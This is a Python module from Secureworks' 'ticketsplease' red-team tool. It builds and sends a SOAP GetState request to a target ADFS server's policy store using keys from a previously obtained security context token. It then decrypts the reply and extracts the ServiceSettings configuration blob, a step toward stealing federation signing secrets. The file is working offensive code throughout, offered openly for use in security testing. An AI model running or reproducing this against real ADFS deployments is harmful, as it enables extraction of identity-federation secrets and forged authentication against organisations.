# Copyright 2021 Secureworks
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import html
import base64
import logging
from bs4 import BeautifulSoup  # type: ignore
from typing import Dict
from xml.etree import ElementTree

from ticketsplease.modules.adfs.envelope.utils import (
    NAMESPACES,
    send_envelope,
    derive_wstrustkey,
    create_soap_envelope,
    decrypt_wstrust_cipherdata,
)


class ADFS_ENVELOPE:
    def _create_adfs_envelope(
        self,
        key: bytes,
        context: bytes,
        keyIdentifier: bytes,
        server: str,
        command: str,
    ):
        """Build a ADFS enevlope.

        Arguments:
            key: security key from parsed RSTR
            context: security context from parsed RSTR
            keyIdentifier: key identifier from parsed RSTR
            server: ip_address|hostname of ADFS server
            command: service object type

        Returns:
            ADFS envelope
        """
        # https://github.com/Gerenios/AADInternals/blob/master/ADFS_utils.ps1#L782
        payload = f'<GetState xmlns="http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore"><serviceObjectType>{command}</serviceObjectType><mask xmlns:i="http://www.w3.org/2001/XMLSchema-instance" i:nil="true"></mask><filter xmlns:i="http://www.w3.org/2001/XMLSchema-instance" i:nil="true"></filter><clientVersionNumber>1</clientVersionNumber></GetState>'
        action = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore/IPolicyStoreReadOnlyTransfer/GetState"

        envelope = create_soap_envelope(
            key,
            context,
            keyIdentifier,
            server,
            payload,
            action,
        )

        return envelope

    def _parse_adfs_envelope(
        self,
        envelope: bytes,
        key: bytes,
    ) -> str:
        """Parse the ADFS response envelope and extract the configuration.

        Arguments:
            envelope: ADFS response envelope
            key: security key from parsed SCTR

        Returns:
            ADFS configuration blob
        """
        try:
            tree = ElementTree.fromstring(envelope)

            # https://github.com/Gerenios/AADInternals/blob/master/ADFS_utils.ps1#L709
            # nonce0 = tree.findall(".//c:DerivedKeyToken", NAMESPACES["c"])[0][3].text
            # cipher0 = tree.findall(".//e:EncryptedData", NAMESPACES["e"])[0][2][0].text
            nonce1 = base64.b64decode(
                tree.findall(".//c:DerivedKeyToken", NAMESPACES["c"])[1][1].text
            )
            cipher1 = base64.b64decode(
                tree.findall(".//e:EncryptedData", NAMESPACES["e"])[1][2][0].text
            )
        except Exception as e:
            logging.error(str(e))
            raise TypeError("server responded with malformed ADFS envelope") from e

        logging.info("\tDeriving WSTrust Key")
        derivedKey = derive_wstrustkey(key, nonce1, 32)

        logging.debug(f"\tNonce:         {base64.b64encode(nonce1)}")
        logging.debug(f"\tDerived key:   {base64.b64encode(derivedKey)}")

        logging.info("\tDecrypting WSTrust Cipher Text")

        # https://github.com/Gerenios/AADInternals/blob/master/ADFS_utils.ps1#L727
        # Decrypt the cipher data
        bPlainText = decrypt_wstrust_cipherdata(cipher1, derivedKey)

        logging.debug(f"\tDecrypted SCT Data:\n{bPlainText.decode().strip()}\n")

        # Parse with BeautifulSoup now
        bs = BeautifulSoup(bPlainText, features="lxml")
        bs_propertyset = (
            bs.body.getstateresponse.getstateresult.propertysets.propertyset
        )
        bs_properties = bs_propertyset.findAll("property")
        configuration = bs_properties[3].values.value_x007b_0_x007d_.text

        return html.unescape(configuration)

    @classmethod
    def run(
        cls,
        adfs_host: str,
        sctr: Dict[str, bytes],
    ):
        """Generate and send an ADFS envelope to the target ADFS server.
        Receive the ADFS response and parse the message for the configuration
        data.

        Arguments:
            adfs_host: target ADFS server
            sctr: parsed SCT response object

        Returns:
            parsed ADFS configuration
        """
        logging.info(f"[ * ] Building and sending ADFS envelope to the ADFS server")

        # https://github.com/Gerenios/AADInternals/blob/master/ADFS.ps1#L306
        adfs_envelope = cls._create_adfs_envelope(
            cls,
            sctr["Key"],
            sctr["Context"],
            sctr["Identifier"],
            adfs_host,
            "ServiceSettings",
        )

        logging.debug(f"\tADFS Envelope:\n{adfs_envelope.strip()}")

        # Send the ADFS envelope
        response = send_envelope(adfs_host, adfs_envelope)

        logging.debug(f"\tRST Response Status: {response}")
        logging.debug(f"\tRST Response:\n{response.content}")

        if response.status_code == 200:
            logging.info(f"[ * ] Parsing ADFS envelope response")

            # Parse the initial envelope
            configuration = cls._parse_adfs_envelope(
                cls,
                response.content,
                sctr["Key"],
            )
        else:
            raise ValueError(f"Bad response from ADFS server: {response.status_code}")

        return configuration
